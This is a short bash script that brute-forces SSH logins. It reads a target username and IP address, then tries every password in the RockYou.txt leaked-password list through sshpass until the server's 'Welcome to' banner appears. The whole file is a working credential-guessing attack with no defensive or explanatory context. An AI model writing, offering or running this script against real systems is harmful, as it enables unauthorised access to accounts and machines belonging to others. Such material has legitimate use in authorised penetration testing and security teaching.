#!/bin/bash

read -p "Enter username: " user
read -p "Enter IP address: " ip
while read -r pass
do
  loggedin=$(timeout 0.6 sshpass -p "${pass}" ssh ${user}@${ip} 2>>/dev/null)
  if [[ $loggedin == *"Welcome to"* ]]; then
    echo "The password is ${pass}"
    break
  fi
done<RockYou.txt